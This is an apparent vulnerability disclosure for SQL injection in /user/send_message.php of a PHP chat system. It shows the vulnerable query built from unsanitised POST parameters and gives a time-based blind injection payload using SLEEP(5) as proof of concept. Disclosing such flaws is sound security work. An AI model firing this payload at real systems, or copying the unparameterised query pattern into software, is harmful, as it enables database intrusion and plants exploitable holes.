# Chat System Using PHP has sql injection in /user/send_message.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/send_message.php



## describe


The id and msg parameter in /user/send_message.php is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('../conn.php');
	session_start();
	if(isset($_POST['msg'])){		
		$msg=$_POST['msg'];
		$id=$_POST['id'];
		mysqli_query($conn,"insert into `chat` (chatroomid, message, userid, chat_date) values ('$id', '$msg' , '".$_SESSION['id']."', NOW())") or die(mysqli_error());
	}
?>
```

Inserting $_POST['id'] into Mysql query without any filter. A time-based blind SQL injection can be triggered.





## POC

```
msg=test&id=1' AND (SELECT SLEEP(5)) AND '1'='1
```

Send this request, you can observe an additional 5 seconds time delay triggered by the time-based injection.
